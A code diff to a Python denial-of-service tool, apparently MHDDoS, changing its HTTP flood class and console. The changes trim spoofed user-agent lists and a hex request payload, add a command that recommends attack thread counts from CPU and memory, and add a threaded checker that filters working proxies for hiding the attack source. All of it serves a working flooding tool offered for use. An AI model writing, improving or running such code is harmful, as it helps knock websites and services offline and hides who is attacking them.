@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
- 
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -19,7 +19,7 @@ from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
 from sys import exit as _exit
-from threading import Event, Thread
+from threading import Event, Thread, Lock
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
@@ -32,7 +32,7 @@ from cloudscraper import create_scraper
 from dns import resolver
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
-from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
+from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory, cpu_count
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
@@ -726,14 +726,9 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',
                 'Safari/537.36',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
-                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
                 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                 'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                 'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                 'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
@@ -749,11 +744,6 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',
                 'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
                 'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
-                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
@@ -1155,11 +1145,7 @@ class HttpFlood(Thread):
                r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
                r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
                r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
-               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
-               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
-               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
-               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
-               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
+               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
         p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        hexh) +
@@ -1274,7 +1260,7 @@ class ProxyManager:
 
 
 class ToolsConsole:
-    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}
+    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT", "RECOMMEND"}
 
     @staticmethod
     def checkRawSocket():
@@ -1287,7 +1273,7 @@ class ToolsConsole:
     def runConsole():
         cons = f"{gethostname()}@MHTools:~#"
 
-        while 1:
+        while True:
             cmd = input(cons + " ").strip()
             if not cmd: continue
             if " " in cmd:
@@ -1432,6 +1418,9 @@ class ToolsConsole:
                                 (r.address, r.avg_rtt, r.packets_received,
                                  r.packets_sent,
                                  "ONLINE" if r.is_alive else "OFFLINE"))
+            if cmd == "RECOMMEND":
+                ToolsConsole.recommend()
+                continue
 
     @staticmethod
     def stop():
@@ -1478,7 +1467,26 @@ class ToolsConsole:
                len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                argv[0], argv[0], argv[0], argv[0]))
 
-    # noinspection PyBroadException
+    @staticmethod
+    def recommend():
+        cpu_cnt = cpu_count(logical=False) or cpu_count()
+        total_memory = virtual_memory().total
+        total_memory_gb = total_memory / (1024 ** 3)
+
+        # Simple recommendation logic
+        # For each CPU core, we recommend 100 threads
+        recommended_threads = cpu_cnt * 100
+
+        # If memory is less than 4 GB, reduce the threads proportionally
+        if total_memory_gb < 4:
+            recommended_threads = int(recommended_threads * (total_memory_gb / 4))
+
+        logger.info(f"System Information:")
+        logger.info(f"CPU Cores: {cpu_cnt}")
+        logger.info(f"Total Memory: {total_memory_gb:.2f} GB")
+        logger.info(f"Recommended Number of Threads: {recommended_threads}")
+
+    # noinspection PyUnreachableCode
     @staticmethod
     def ts_srv(domain):
         records = ['_ts3._udp.', '_tsdns._tcp.']
@@ -1505,6 +1513,37 @@ class ToolsConsole:
         return {"success": False}
 
 
+def check_proxy(proxy, timeout, url):
+    try:
+        session = Session()
+        session.proxies = proxy.asRequest()
+        session.get(url, timeout=timeout)
+        return True
+    except Exception:
+        return False
+
+from tqdm import tqdm
+
+def check_proxies_with_progress(proxies, timeout, threads, url):
+    total_proxies = len(proxies)
+    working_proxies = set()
+
+    def check_proxy_wrapper(proxy):
+        return check_proxy(proxy, timeout, url)
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = {executor.submit(check_proxy_wrapper, proxy): proxy for proxy in proxies}
+        for future in tqdm(as_completed(futures), total=total_proxies, desc='Checking proxies'):
+            proxy = futures[future]
+            try:
+                if future.result():
+                    working_proxies.add(proxy)
+            except Exception:
+                pass  # Handle exceptions if necessary
+
+    return working_proxies
+
+
 def handleProxyList(con, proxy_li, proxy_ty, url=None):
     if proxy_ty not in {4, 5, 1, 0, 6}:
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
@@ -1519,7 +1558,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             logger.info(
                 f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
-            Proxies = ProxyChecker.checkAll(
+            Proxies = check_proxies_with_progress(
                 Proxies, timeout=5, threads=threads,
                 url=url.human_repr() if url else "http://httpbin.org/get",
             )
